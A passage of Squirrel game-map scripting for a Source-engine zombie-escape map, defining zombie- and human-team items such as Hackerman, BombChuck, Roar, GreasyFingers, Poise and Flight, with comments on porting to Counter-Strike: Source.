					"Just keep firing and get kill after kill\nNearby/targeted zombies become 1-hit\nNearby zombies get wallhack-marked\nCan hurt/stun boss",{
				model=null,
				uses = (0+::ITEMS.hackerman.uses),
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						//button.PrecacheModel("models/props_office/office_keyboard.mdl");
						button.PrecacheModel("models/props_c17/computer01_keyboard.mdl");
						::Ent(button.GetOrigin()+Vector(0,0,-40),button.GetAngles()+Vector(0,180,0),"prop_dynamic",{		//__CSS__ og .y was -90
								//model="models/props_office/office_keyboard.mdl",			//__CSS__ <og - doesn't exist in CSS
								model="models/props_c17/computer01_keyboard.mdl",
								rendermode = 1,
							},{
							button = button,
							logic = this,
							function Run(){
								logic.model = self;
								EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
							}});
					}
					//else if(event==2){}//pickup
					//else if(event==3){}//drop
					//else if(event==4){}//use_failed
					else if(event==5)//use
					{
						if(!::MOTHER_ZOMBIE_SPAWNED)return false;
						if(::ITEMS.squid.PlayerInked(user))return;
						button.GetScriptScope().cooldown = 0.00+::ITEMS.hackerman.cooldown;
						uses--;
						if(uses<=0)EntFireByHandle(button,"Kill","",0.00,null,null);
						EntFireByHandle(model,"AddOutput","rendercolor 255 0 0 50",0.00,null,null);
						::Sound("*luffaren/hackerman.mp3",Vector(0,0,50),user,20000,10.05,RandomInt(98,102),10);
						::Particle("blood_spurt_synth_01",button.GetOrigin(),Vector(),null,0.05);
						::Ent(Vector(),Vector(),"logic_relay",{},{
							user = user,
							done = false,
							function Tick(){
								if(done)
								{
									EntFireByHandle(self,"Kill","",0.00,null,null);
									return;
								}
								EntFireByHandle(self,"RunScriptCode"," Tick(); ",::ITEMS.hackerman.tickrate,null,null);
								if(::round_ended){done=true;return;}
								if(user==null||!user.IsValid()||user.GetTeam()!=3||user.IsAlive()==false){done=true;return;}
								local target = null;
								local targetdist = 999999.00;
								for(local h;h=Entities.FindByClassnameWithin(h,"player",user.GetOrigin(),::ITEMS.hackerman.target_range);)
								{
									if(h==null||!h.IsValid()||h.GetTeam()!=2||h.IsAlive()==false)continue;
									h.ValidateScriptScope();if("invincible" in h.GetScriptScope())continue;
									local dist = ::GetDistance(user.GetOrigin(),h.GetOrigin());
									if(dist<targetdist)
									{
										targetdist = (0.00+dist);
										target = h;
									}
								}
								if(target==null||!target.IsValid())return;
								EntFireByHandle(target,"AddOutput","health 1",0.00,null,null);
								local dir = target.GetOrigin()+Vector(RandomInt(-::ITEMS.hackerman.aimvar,
									::ITEMS.hackerman.aimvar),RandomInt(-::ITEMS.hackerman.aimvar,::ITEMS.hackerman.aimvar),
									RandomInt(::ITEMS.hackerman.aimvar_z_min,::ITEMS.hackerman.aimvar_z_max));
								dir = dir-user.EyePosition();
								dir.Norm();
								user.SetForwardVector(dir);
								
								//__CSS__ ammo_refill new
								local held_weapon = ::NetProps.GetPropEntity(user,"m_hActiveWeapon");
								if(held_weapon==null||held_weapon.GetClassname()=="weapon_hegrenade"||held_weapon.GetClassname()=="weapon_knife"){}
								else held_weapon.SetClip1(30);
								
								//__CSS__ ammo_refill old
								//local c = user.FirstMoveChild();
								//while(c!=null)
								//{
								//	if(c.GetClassname().find("weapon_")==0)
								//		EntFireByHandle(c,"SetAmmoAmount","30",0.00,null,null);
								//	c = c.NextMovePeer();
								//}
								
								::Particle("blood_spurt_synth_01",target.GetOrigin()+Vector(0,0,30),Vector(),null,0.05);
							},
							function Run(){
								EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.05,null,null);
								EntFireByHandle(self,"RunScriptCode"," done = true; ",::ITEMS.hackerman.time,null,null);
								if(Entities.FindByName(null,"hackerman_wallhack_indicator")==null)//do this to prevent edict spam if multiple users at the same time..
								{
									for(local h;h=Entities.FindByClassnameWithin(h,"player",user.GetOrigin(),::ITEMS.hackerman.wallhack_range);)
									{
										if(h==null||!h.IsValid()||h.GetTeam()!=2||h.IsAlive()==false)continue;
										//::manager.PrecacheModel("models/luffaren/heal_orb.mdl");
										::Ent(h.GetOrigin()+Vector(0,0,::ITEMS.hackerman.wallhack_zoffset),Vector(),"prop_dynamic",{
												model="models/luffaren/heal_orb.mdl",
												modelscale = 0.35,
												rendermode = 3,
												skin = 1,
												renderamt = 255,
												rendercolor = "255 0 0",
												targetname = "hackerman_wallhack_indicator",
											},{
											master = h,
											killself = false,
											function Think(){
												if(killself||master==null||!master.IsValid()||!master.IsAlive()||master.GetTeam()!=2)
												{
													EntFireByHandle(self,"Kill","",0.00,null,null);
													return 2.0;
												}
												return 0.10;
											},function Run(){
												self.AcceptInput("SetParent","!activator",master,null);
												//EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
												EntFireByHandle(self,"RunScriptCode","killself=true;",::ITEMS.hackerman.time,null,null);
												
												AddThinkToEnt(self,"Think");
												self.SetLocalOrigin(Vector(0,0,::ITEMS.hackerman.wallhack_zoffset));
												//EntFireByHandle(self,"setlocalorigin","0 0 "+::ITEMS.hackerman.wallhack_zoffset.tostring(),0.05,null,null);
												//EntFireByHandle(self,"setlocalorigin","0 0 "+::ITEMS.hackerman.wallhack_zoffset.tostring(),0.50,null,null);
											}});
									}
								}
							}});
						::HurtStunBoss(button.GetOrigin(),::ITEMS.hackerman.bosshit[0],::ITEMS.hackerman.bosshit[1],::ITEMS.hackerman.bosshit[2],::ITEMS.hackerman.bosshit[3],null);
						return true;
					}
					else if(event==6)//ready
					{
						EntFireByHandle(model,"AddOutput","rendercolor 255 255 255 255",0.00,null,null);
					}
				}},hammerid);
		}
	},
	bomb_chuck = {
			team = 2,
			hammerid = 16,	//example: 1 (range 1-999)
			cooldown = 10.00,
			uses = 3,
			thrust_force = 15000,
			thrust_time = 0.10,
			pitch_offset = -5,
			blow_time = 5.00,
			magnitude = 250,
			radiusoverride = 0,
			slay_e_press_humans = true,
			explosion_owner = null,
			explosion_handle = null,
		nameindex = 0,
		function Spawn(pos){
			::CreateItem(pos,Vector(),3,"BombChuck","("+cooldown.tostring()+"s|"+uses.tostring()+"x)\nThrow a bomb that blows up after "+blow_time.tostring()+"s"+
				"\nIt throws towards your look-direction\nDeals AOE/explosive damage",{
				model = null,
				uses = (0+::ITEMS.bomb_chuck.uses),
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						//button.PrecacheModel("models/luffaren/bomb_chuck.mdl");
						::Ent(button.GetOrigin()+Vector(0,0,-35),Vector(0,RandomInt(0,360),0),"prop_dynamic",{
								model="models/luffaren/bomb_chuck.mdl",
								modelscale = 0.60,
								rendermode = 1,
							},{
							button = button,
							logic = this,
							function Run(){
								logic.model = self;
								EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
							}});
					}
					else if(event==2)//pickup
					{
						EntFireByHandle(user,"AddOutput","health "+::Z_ITEM_HP.tostring(),0.00,null,null);
					}
					//else if(event==3){}//drop
					//else if(event==4){}//use_failed
					else if(event==5)//use
					{
						button.GetScriptScope().cooldown = 0.00+::ITEMS.bomb_chuck.cooldown;
						uses--;
						if(uses<=0)EntFireByHandle(button,"Kill","",0.00,null,null);
						EntFireByHandle(model,"AddOutput","rendercolor 255 0 0 150",0.00,null,null);
						::EyeTrace(user,{function Run(player,dir,rot){
								::ITEMS.bomb_chuck.SpawnBombChuck(player.EyePosition(),rot,player);
							}});
						return true;
					}
					else if(event==6)//ready
					{
						EntFireByHandle(model,"AddOutput","renderamt 255",0.00,null,null);
						EntFireByHandle(model,"AddOutput","rendercolor 255 255 255 255",0.00,null,null);
					}
				}},hammerid);
		},
		function SpawnBombChuck(pos,rot,bowner=null)
		{
			::ITEMS.bomb_chuck.nameindex++;
			local nindex = (0+::ITEMS.bomb_chuck.nameindex).tostring();
			//::manager.PrecacheModel("models/luffaren/bomb_chuck.mdl");
			::Ent(pos,Vector(RandomInt(0,360),RandomInt(0,360),RandomInt(0,360)),"prop_physics_override",{
					targetname = "i_item_bomb_chuck_"+nindex,
					model="models/luffaren/bomb_chuck.mdl",
					spawnflags = 262,		//don't take physics damage + debris + generate input on use
					massscale = 1.00,
					//overridescript = "damping,1.10",
					nodamageforces = 1,
					DisableBoneFollowers = true,
				},{
				nindex = nindex,
				rot = rot,
				bowner = bowner,
				blown = false,
				function InputUse(){
					if(blown)return;
					EntFireByHandle(self,"RunScriptCode"," Used(); ",0.00,activator,null);
				},function Blow(){
					if(blown)return;
					blown = true;
					EntFireByHandle(self,"Kill","",0.00,null,null);
					::Sound("weapons/sensorgrenade/sensor_explode.wav",self.GetOrigin(),null,5000,0.20,RandomInt(130,150),10);
					::Sound("weapons/g3sg1/g3sg1_distant_01.wav",self.GetOrigin(),null,20000,0.20,RandomInt(130,150),10);
					self.AcceptInput("DisableMotion","",null,null);		//__CSS__ new on-blow
					self.SetSolid(0);									//__CSS__ new on-blow
					::Ent(self.GetOrigin(),Vector(),"env_explosion",{
							//fireballsprite = "sprites/zerogxplode.spr", //__CSS__ this shouldnt be needed
							iMagnitude = (0+::ITEMS.bomb_chuck.magnitude) * ::HURTPLAYER_mult_ct,
							iRadiusOverride = (0+::ITEMS.bomb_chuck.radiusoverride),
							rendermode = 5,
							spawnflags = 2,
							rendercolor = "255 255 255",
						},{
						bowner = this.bowner,
						function Run(){
							
							::ITEMS.bomb_chuck.explosion_owner = this.bowner;
							::ITEMS.bomb_chuck.explosion_handle = self;
							
							EntFireByHandle(self,"Explode","",0.01,null,null);
							EntFireByHandle(self,"Kill","",0.05,null,null);
						}});
				},
				function Used(){		//when a player presses E on the bomb (activator is playerhandle)
					if(!::ITEMS.bomb_chuck.slay_e_press_humans)return;
					if(activator==null||!activator.IsValid()||activator.GetTeam()!=3)return;
					if(blown)return;
					blown = true;
					EntFireByHandle(self,"Kill","",0.00,null,null);
					::PlayerNameMessage(activator,""," died trying to defuse a bomb",0.00);
					::HurtPlayer(activator,999999,self.GetOrigin(),RandomInt(300,400),bowner,"bignades");
					::Sound("weapons/sensorgrenade/sensor_explode.wav",self.GetOrigin(),null,5000,0.10,RandomInt(230,255),10);
					::Sound("weapons/g3sg1/g3sg1_distant_01.wav",self.GetOrigin(),null,20000,0.10,RandomInt(230,255),10);
					self.AcceptInput("DisableMotion","",null,null);		//__CSS__ new on-blow
					self.SetSolid(0);									//__CSS__ new on-blow
					::Ent(self.GetOrigin(),Vector(),"env_explosion",{
							//fireballsprite = "sprites/zerogxplode.spr", //__CSS__ this shouldnt be needed
							iMagnitude = 1,
							iRadiusOverride = 1,
							rendermode = 5,
							spawnflags = 2,
							rendercolor = "255 255 255",
						},{
						function Run(){
							EntFireByHandle(self,"Explode","",0.01,null,null);
							EntFireByHandle(self,"Kill","",0.05,null,null);
						}});
				},
				function Run(){
					Inputuse <- InputUse;
					::Sound("*luffaren/kart_bob.mp3",Vector(),self,20000,0.50,RandomInt(80,100),10);
					EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(2);",0.00,null,null);
					EntFireByHandle(self,"RunScriptCode"," Blow(); ",::ITEMS.bomb_chuck.blow_time,null,null);
					local thrust_angles = ""+(rot.x+::ITEMS.bomb_chuck.pitch_offset).tostring()+" "+rot.y.tostring()+" "+rot.z.tostring();
					
					self.SetPhysVelocity(::AnglesToDir(rot) * ::ITEMS.bomb_chuck.thrust_force);
					/*
					::Ent(self.GetOrigin(),Vector(),"phys_thruster",{
							attach1 = "i_item_bomb_chuck_"+nindex,
							forcetime = 0,
							force = (0.00+::ITEMS.bomb_chuck.thrust_force),
							spawnflags = 50,
							angles = thrust_angles,
						},{
						master = self,
						function Run(){
							master.__KeyValueFromString("targetname","i_item_bomb_chuck");
							::ITEMS.bomb_chuck.nameindex--;
							EntFireByHandle(self,"Activate","",0.00,null,null);
							EntFireByHandle(self,"Kill","",::ITEMS.bomb_chuck.thrust_time,null,null);
						}});
					*/
					
					::Ent(self.GetOrigin(),Vector(),"env_spritetrail",{
							lifetime = 0.80,
							startwidth = 50,
							endwidth = 0.01,
							rendermode = 5,
							rendercolor = "255 80 0",
							renderamt = 255,
							spritename = "sprites/physbeam.vmt",
						},{
						model = self,
						function Run(){
							EntFireByHandle(self,"SetScale","1.00",0.02,null,null);
							EntFireByHandle(self,"ShowSprite","",0.02,null,null);
							//EntFireByHandle(self,"SetParent","!activator",0.00,model,null);
							self.AcceptInput("SetParent","!activator",model,null);
						}});
					
					
					//__CSS__ this logic is moved to InputUse now ^
					//if(::ITEMS.bomb_chuck.slay_e_press_humans)
					//	::EventListener("player_use",{
					//		master = self,
					//		function Tick(){
					//			if(master==null||!master.IsValid())
					//			{
					//				EntFireByHandle(handle,"Kill","",0.00,null,null);
					//				return;
					//			}
					//			EntFireByHandle(handle,"RunScriptCode"," logic.Tick(); ",2.00,null,null);
					//		},function Run(){
					//			EntFireByHandle(handle,"RunScriptCode"," logic.Tick(); ",2.00,null,null);
					//		},function EventFired(name,data){
					//			if(master==null||!master.IsValid())return;
					//			if(data.entity != master.entindex())return;
					//			local pc = ::GetPlayerClass(data.userid);
					//			if(pc==null)return;
					//			EntFireByHandle(master,"RunScriptCode"," Used(); ",0.00,pc.handle,null);
					//		}});
						
				}});
		}
	},
	roar = {
			team = 2,
			hammerid = 15,	//example: 1 (range 1-999)
			range = 300,
			cooldown = 30.00,
			uses = 1,
			
			//__CSS__ old values:
			vel_xy = 450,
			vel_z = 400,
			vel_z_minset = 260,
				//__CSS__ new above, old below:
			//vel_xy = 500,
			//vel_z = 280,
			//vel_z_minset = 240,			//needs to be below this z-vel to set 'vel_z'
			
			hp_set = 10000,				//sets z-hp to this value IF below it (user included)
		function Spawn(pos){
				//::CreateItem(pos,Vector(),3,"Roar","("+cooldown.tostring()+"s)\nPush nearby zombies forward with a roar\n"+	//old - one-time use in v1_5
			::CreateItem(pos,Vector(),3,"Roar","("+uses.tostring()+"x)\nPush nearby zombies forward with a roar\n"+
					"The push goes towards your side-look-direction\nSurprise the human defenses!\nIt also heals you + nearby zombies to "+hp_set+"hp",{
				model=null,
				uses = (0+::ITEMS.roar.uses),
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						//button.PrecacheModel("models/luffaren/roar.mdl");
						::Ent(button.GetOrigin()+Vector(0,0,-35),button.GetAngles()+Vector(-10,180,0),"prop_dynamic",{
								model="models/luffaren/roar.mdl",
								modelscale = 0.70,
								rendermode = 1,
								renderamt = 255,
								rendercolor = "255 255 255",
							},{
							button = button,
							logic = this,
							function Run(){
								logic.model = self;
								EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
							}});
					}
					//else if(event==2){}//pickup
					//else if(event==3){}//drop
					//else if(event==4){}//use_failed
					else if(event==5)//use
					{
						button.GetScriptScope().cooldown = (0.00+::ITEMS.roar.cooldown);
						uses--;
						if(uses<=0)EntFireByHandle(button,"Kill","",0.00,null,null);
						local spitch = RandomInt(95,105);
						for(local i=0;i<3;i++)
							::Sound("*luffaren/roar.mp3",button.GetOrigin()+Vector(0,0,200),null,50000,0.05,spitch,10);
						::Particle("blood_spurt_synth_01",button.GetOrigin(),Vector(),null,0.10);
						::Particle("water_splash_01_refract",button.GetOrigin(),Vector(),null,0.10);
						EntFireByHandle(model,"AddOutput","renderamt 80",0.00,null,null);
						EntFireByHandle(model,"AddOutput","rendercolor 255 0 0 80",0.00,null,null);
						local vel = (user.GetForwardVector()*::ITEMS.roar.vel_xy)+Vector(0,0,::ITEMS.roar.vel_z);
						for(local h;h=Entities.FindByClassnameWithin(h,"player",user.GetOrigin(),::ITEMS.roar.range);)
						{
							if(h==null||!h.IsValid()||h.GetTeam()!=2||h.IsAlive()==false)continue;
							if(h.GetHealth()<::ITEMS.roar.hp_set)EntFireByHandle(h,"AddOutput","health "+::ITEMS.roar.hp_set.tostring(),0.00,null,null);
							if(h==user)continue;//added in v1_5
							local velset = Vector()+vel;
							if(h.GetVelocity().z >= ::ITEMS.roar.vel_z_minset)velset.z = h.GetVelocity().z;
							h.SetVelocity(velset);
						}
						//button.PrecacheModel("models/luffaren/roar.mdl");
						::Ent(button.GetOrigin()+Vector(0,0,100),button.GetAngles(),"prop_dynamic",{
								model="models/luffaren/roar.mdl",
								modelscale = 0.01,
								rendermode = 1,
								renderamt = 255,
								rendercolor = "255 255 255",
							},{
							modelscale = 0.01,
							function Tick(){
								//if(modelscale>10.00)		//__CSS__ <og, way too big in css
								if(modelscale>3.00)		//__CSS__ <new
								{
									//EntFireByHandle(self,"fadeandkill","1",1.20,null,null);
									::FadeAndKill(self,1.00,1.20);		//__CSS__ fadeandkill doesn't exist in css
									return;
								}
								EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.01,null,null);
								modelscale += 0.40;
								self.SetOrigin(self.GetOrigin()+Vector(0,0,7));
								//self.__KeyValueFromFloat("modelscale",modelscale);
								::NetProps.SetPropFloat(self,"m_flModelScale",modelscale);
							},function Run(){
								EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.01,null,null);
							}});
						return true;
					}
					else if(event==6)//ready
					{
						EntFireByHandle(model,"AddOutput","renderamt 255",0.00,null,null);
						EntFireByHandle(model,"AddOutput","rendercolor 255 255 255 255",0.00,null,null);
					}
				}},hammerid);
		}
	},
	greasy_fingers = {
			team = 2,
			hammerid = 14,	//example: 1 (range 1-999)
			range = 500,
			drop_rate = 0.10,
			drop_time = 2.00,
			print_name = true,
		function Spawn(pos){
			::CreateItem(pos,Vector(),3,"GreasyFingers","(1x)\nMakes nearby humans drop their held weapons\n"+
					"(for "+drop_time.tostring()+" seconds)"+
					"\nYou get one chance, use it wisely",{
				model=null,
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						//button.PrecacheModel("models/luffaren/heal_orb.mdl");
						::Ent(button.GetOrigin()+Vector(0,0,-35),button.GetAngles()+Vector(90,0,0),"prop_dynamic",{
								model="models/luffaren/heal_orb.mdl",
								modelscale = 0.35,
								rendermode = 3,
								renderamt = 100,
								glowenabled = 1,
								glowdist = 10000,
								glowstyle = 1,
								rendercolor = "0 0 0",
								glowcolor = Vector(255,0,50),
							},{
							button = button,
							logic = this,
							function Run(){
								logic.model = self;
								EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
							}});
					}
					//else if(event==2){}//pickup
					//else if(event==3){}//drop
					//else if(event==4){}//use_failed
					else if(event==5)//use
					{
						button.GetScriptScope().cooldown = null;
						EntFireByHandle(button,"Kill","",0.00,null,null);
						local spitch = RandomInt(95,105);
						for(local i=0;i<3;i++)
							::Sound("*luffaren/greasy_fingers.mp3",Vector(),button,10000,0.05,spitch,10);
						::Particle("blood_spurt_synth_01",button.GetOrigin(),Vector(),null,0.10);
						local confettis = [
							"blood_impact_synth_01_dust"
							,"blood_impact_synth_01_armor"
							,"blood_impact_antlion_01"
						];
						for(local i=0;i<360;i+=50)
						{
							local ppos = button.GetOrigin()+(::AnglesToDir(Vector(0,i,0))*(::ITEMS.greasy_fingers.range-40));
							//::Particle(confettis[RandomInt(0,confettis.len()-1)]",ppos,Vector(),null,0.05);
							::Particle("explosion_huge_b",ppos,Vector(90,i,0),null,0.05);
						}
						for(local h;h=Entities.FindByClassnameWithin(h,"player",user.GetOrigin(),::ITEMS.greasy_fingers.range);)
						{
							if(h==null||!h.IsValid()||h.GetTeam()!=3||h.IsAlive()==false)continue;
							for(local i=0.00;i<::ITEMS.greasy_fingers.drop_time;i+=::ITEMS.greasy_fingers.drop_rate)
								EntFire("client","Command","drop",i,h);
							if(::ITEMS.greasy_fingers.print_name)::PlayerNameMessage(h,"Golly, "," got greased!",0.00);
							else ::ServerSay("say Golly, someone got greased!",0.00,null);
						}
						return true;
					}
				}},hammerid);
		}
	},
	poise = {
			team = 2,
			hammerid = 13,	//example: 1 (range 1-999)
			invincible_time = 1.50,
			fear_range = 500,		//null:disables the human fear-slowdown completely
			fear_slowdown = 0.75,
			fear_slowtime = 1.00,
			illusion_amount = 15,
		function Spawn(pos){
			::CreateItem(pos,Vector(),3,"Poise","(1x)\nGives "+invincible_time.tostring()+"s invincibility on-use\n"+
					"Human items/bullets can't affect you\nNearby humans also get frozen by fear briefly\n"+
					""+illusion_amount.tostring()+"x forward-moving illusion-copies spawn too"+
					"\nTime it wisely, you only have one shot",{
				model=null,
				function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						//button.PrecacheModel("models/luffaren/poise.mdl");
						::Ent(button.GetOrigin()+Vector(0,0,-32),button.GetAngles(),"prop_dynamic",{
								model="models/luffaren/poise.mdl",
								rendermode = 1,
								modelscale = 1.00,
							},{
							button = button,
							logic = this,
							function Run(){
								logic.model = self;
								EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
							}});
					}
					//else if(event==2){}//pickup
					//else if(event==3){}//drop
					//else if(event==4){}//use_failed
					else if(event==5)//use
					{
						button.GetScriptScope().cooldown = null;
						EntFireByHandle(button,"Kill","",::ITEMS.poise.invincible_time,null,null);
						for(local i=0;i<3;i++)
							::Sound("*luffaren/poise.mp3",Vector(0,0,48),user,5000,2.00,RandomInt(80,100),10);
						user.ValidateScriptScope();
						user.GetScriptScope().poise <- true;
						EntFire("manager","RunScriptCode"," CheckZombieInvincibility(); ",0.00,user);
						EntFireByHandle(user,"RunScriptCode"," if(\"poise\" in this)delete poise; ",::ITEMS.poise.invincible_time,null,null);
						EntFire("manager","RunScriptCode"," CheckZombieInvincibility(); ",::ITEMS.poise.invincible_time+0.01,user);
						EntFire("manager","RunScriptCode"," CheckZombieInvincibility(); ",::ITEMS.poise.invincible_time+0.05,user);
						EntFire("manager","RunScriptCode"," CheckZombieInvincibility(); ",::ITEMS.poise.invincible_time+0.20,user);
						if(::ITEMS.poise.fear_range != null)
						{
							for(local h;h=Entities.FindByClassnameWithin(h,"player",user.GetOrigin(),::ITEMS.poise.fear_range);)
							{
								if(h==null||!h.IsValid()||h.GetTeam()!=3||h.IsAlive()==false)continue;
								EntFire("manager","RunScriptCode"," AddSpeed(-"+::ITEMS.poise.fear_slowdown.tostring()+"); ",0.00,h);
								EntFire("manager","RunScriptCode","AddSpeed("+::ITEMS.poise.fear_slowdown.tostring()+"); ",::ITEMS.poise.fear_slowtime,h);
							}
						}
						EntFireByHandle(model,"ClearParent","",0.00,null,null);
						model.ValidateScriptScope();
						model.GetScriptScope().bufferpos <- user.GetOrigin()+Vector(0,0,100)-(user.GetForwardVector()*20);
						model.GetScriptScope().scale <- 1.50;
						model.GetScriptScope().TickScale<-function()
						{
							//if(scale>=30.00)		//__CSS__ <og - too large
							if(scale>=4.50)		//__CSS__ <new
							{
								//EntFireByHandle(self,"fadeandkill","0.5",0.20,null,null);
								::FadeAndKill(self,0.50,1.20);		//__CSS__ fadeandkill doesn't exist in css
								return;
							}
							EntFireByHandle(self,"RunScriptCode"," TickScale(); ",0.01,null,null);
							scale += 1.00;
							//self.__KeyValueFromFloat("modelscale",scale);
							::NetProps.SetPropFloat(self,"m_flModelScale",scale);
							self.SetOrigin(self.GetOrigin()+Vector(0,0,3));
						}
						EntFireByHandle(model,"RunScriptCode"," self.SetOrigin(bufferpos); ",0.01,null,null);
						EntFireByHandle(model,"RunScriptCode"," TickScale(); ",0.00,null,null);
						::SpawnPlayerIllusion(user,::ITEMS.poise.illusion_amount,20);
					}
				}},hammerid);
		}
	},
	flight = {
			team = 2,
			hammerid = 12,	//example: 1 (range 1-999)
			tpback_all = false,					//set this to 'true' to completely bypass/TP all infected humans back, no matter what (else only valid z's)
			hpcap_base = 1,						//how much base HP each flight-zombie should get
			hpcap_each = 10,					//how much extra HP (per CT alive) each flight-zombie should get
			hpcap_tickrate = 2.00,				//how fast to tick-update the HPcap rate
			hp_cap = 500,						//DO NOT TOUCH - this value is what actually gets set by the above^
			vel_cap = 400,
			safedist_end = 300,
			safedist_endbutton = 200,		//__CSS__ og was 150
			safedist_finale_elevator = 400,
			description = null,
		slay_enabled = false,	//set to 'true' to disable spawning new flights + slaying holders
		eventlistener_already_setup = false,
		eventlistener_userids = [],
		function TickFlightItemHpCap(){
			EntFire("manager","RunScriptCode","::ITEMS.flight.TickFlightItemHpCap();",::ITEMS.flight.hpcap_tickrate,null);
			local hpcap = (0+::ITEMS.flight.hpcap_base);
			for(local h;h=Entities.FindByClassname(h,"player");)
			{
				if(h==null||!h.IsValid()||h.GetTeam()!=3||h.IsAlive()==false)continue;
				hpcap += ::ITEMS.flight.hpcap_each;
			}
			//printl("HPCAP CLIMB: "+hpcap);
			::ITEMS.flight.hp_cap = (0+hpcap);
		},	
		function SetupEventListener()
		{
			if(eventlistener_already_setup)return;
			eventlistener_already_setup = true;
			EntFire("manager","RunScriptCode","::ITEMS.flight.TickFlightItemHpCap();",0.10,null);
			::EventListener("player_death",{function EventFired(name,data){
				local should_tp_back = false;
				if(::ITEMS.flight.tpback_all)
					should_tp_back = true;
				else
				{
					foreach(id in ::ITEMS.flight.eventlistener_userids)
					{
						if(id==data.attacker)
						{
							should_tp_back = true;
							break;
						}
					}
				}
				if(should_tp_back)
				{
					//printl("[Z-flight item eventlistener KILL-TRIGGERED]: attacker:"+data.attacker+" | victim:"+data.userid);
					local pc = ::GetPlayerClass(data.userid);
					if(pc==null)printl("[Z-flight item eventlistener ERROR]: victim:"+data.userid+" found no playerclass!");
					else
					{
						if(pc.handle==null||!pc.handle.IsValid()){}
							//printl("[Z-flight item eventlistener ERROR]: victim:"+data.userid+" found no valid playerhandle in playerclass!");
						else
						{
							pc.handle.SetOrigin(Vector(0,0,-16160));
							pc.handle.SetVelocity(Vector());
							EntFireByHandle(pc.handle,"RunScriptCode"," self.SetOrigin(Vector(0,0,-16160));self.SetVelocity(Vector()); ",0.10,null,null);
							//printl("[Z-flight item eventlistener KILL-MOVE-SUCCCESS]: attacker:"+data.attacker+" | victim:"+data.userid);
						}
					}
				}
			}});
		},
		function ListenTpBack(player)		//if 'player' (handle) infects someone, the infected on gets TP'd back
		{
			local pc = ::GetPlayerClass(player);
			if(pc==null)return;
			local exists = false;
			for(local i=0;i<::ITEMS.flight.eventlistener_userids.len();i++)
			{
				if(pc.userid==::ITEMS.flight.eventlistener_userids[i])
				{
					exists = true;
					break;
				}
			}
			if(!exists)
			{
				::ITEMS.flight.eventlistener_userids.push(pc.userid);
				//printl("[Z-flight item eventlistener ADD]: "+pc.userid);
			}
		},
		function UnListenTpBack(player)		//removes the infect-listener for 'player' (handle)
		{
			local pc = ::GetPlayerClass(player);
			if(pc==null)return;
			for(local i=0;i<::ITEMS.flight.eventlistener_userids.len();i++)
			{
				if(pc.userid==::ITEMS.flight.eventlistener_userids[i])
				{
					::ITEMS.flight.eventlistener_userids.remove(i);
					//printl("[Z-flight item eventlistener REMOVE]: "+pc.userid);
					break;
				}
			}
		},
		function Spawn(pos){
			
			
			if(description == null)description = "(1x)\nFly by looking+WASD until you die\nHP is capped to "+hp_cap.tostring()+"hp\n"+
					"Infected humans get TP'd back\nYou TP back near the stage-end\n";
			//__CSS__ game_text char limit, old below(v), new above(^)
			/*
			if(description == null)description = "(1x)\nGives you wings to fly with until you die\nYou get capped to "+hp_cap.tostring()+"hp\n"+
					"Humans you infect get TP'd back\nYou TP back when too close to triggering current-stage end\n"+
					"Fly by looking around and using WASD\n(you have slow momentum)";
			*/
			
			if(slay_enabled)return;
			::CreateItem(pos,Vector(),3,"Flight",description,{
				model=null,
				enabledflight = false,
				function EnableFlight(holder,button,user,event)
				{
					if(enabledflight)return;
					enabledflight = true;
					button.GetScriptScope().cooldown = null;
					EntFireByHandle(model,"SetAnimation","flap",0.00,null,null);
					EntFireByHandle(model,"SetDefaultAnimation","flap",0.02,null,null);
					EntFireByHandle(model,"SetPlaybackRate","2.00",0.05,null,null);
					user.SetVelocity(Vector(0,0,300));
					::Ent(Vector(),Vector(),"logic_relay",{},{
						button = button,
						user = user,
						flapsound_cd = false,
						lastpos = Vector(),
						function Tick(){
							if(button==null||!button.IsValid()||user==null||!user.IsValid()||user.IsAlive()==false||::ITEMS.flight.slay_enabled)
							{
								if(button==null||!button.IsValid()){}else
									EntFireByHandle(button,"Kill","",0.00,null,null);
								if(user==null||!user.IsValid()){}else
								{
									EntFireByHandle(user,"SetHealth","-1",0.00,null,null);
									EntFireByHandle(user,"AddOutput","movetype 2",0.00,null,null);
									EntFireByHandle(user,"AddOutput","movetype 2",0.20,null,null);
									::ITEMS.flight.UnListenTpBack(user);
								}
								EntFireByHandle(self,"Kill","",0.00,null,null);
								return;
							}
							EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.05,null,null);
							EntFireByHandle(user,"AddOutput","movetype 4",0.00,null,null);
							if(user.GetHealth()>::ITEMS.flight.hp_cap)
								EntFireByHandle(user,"AddOutput","health "+::ITEMS.flight.hp_cap.tostring(),0.00,null,null);
							if(::ENDINGS.CLIMB.ending_started && user.GetOrigin().z < ::ENDINGS.CLIMB.tplimit_z)::ENDINGS.CLIMB.FlightMoveUser(user);
							if(user.GetVelocity().Length()>::ITEMS.flight.vel_cap)
							{
								local vel = user.GetVelocity();
								vel.Norm();
								vel *= ::ITEMS.flight.vel_cap;
								user.SetVelocity(vel);
							}
